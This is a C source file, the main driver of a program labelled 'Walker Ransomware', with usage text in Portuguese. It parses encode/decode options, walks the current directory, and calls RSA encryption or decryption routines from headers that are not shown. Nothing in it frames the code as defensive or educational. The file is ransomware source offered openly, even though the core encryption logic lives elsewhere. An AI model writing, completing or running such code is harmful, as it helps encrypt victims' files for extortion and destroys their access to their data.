#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <getopt.h>
#include <string.h>
#include "./FileHandler/FileHandler.h"
#include "../src/encryption/RSA/RSA.h"

void print_usage() {
    printf("Walker Ransomware - Uso:\n");
    printf("  -e, --encode     Criptografa arquivos do diretório atual\n");
    printf("  -d, --decode     Descriptografa arquivos com chave privada\n");
    printf("  -h, --help       Exibe esta mensagem de ajuda\n");
}

int main(int argc, char *argv[]) {
    int opt;
    int option_index = 0;
    int action = -1;

    static struct option long_options[] = {
        {"encode", no_argument, 0, 'e'},
        {"decode", no_argument, 0, 'd'},
        {"help",   no_argument, 0, 'h'},
        {0, 0, 0, 0}
    };

    while ((opt = getopt_long(argc, argv, "edh", long_options, &option_index)) != -1) {
        switch (opt) {
            case 'e':
                action = 0;
                break;
            case 'd':
                action = 1;
                break;
            case 'h':
            default:
                print_usage();
                return 0;
        }
    }

    if (action == -1) {
        print_usage();
        return 1;
    }

    if (action == 1) {
        RSA_decrypt();
    }

    walk("./", action);

    if (action == 0) {
        RSA_encrypt();
    }

    return 0;
}

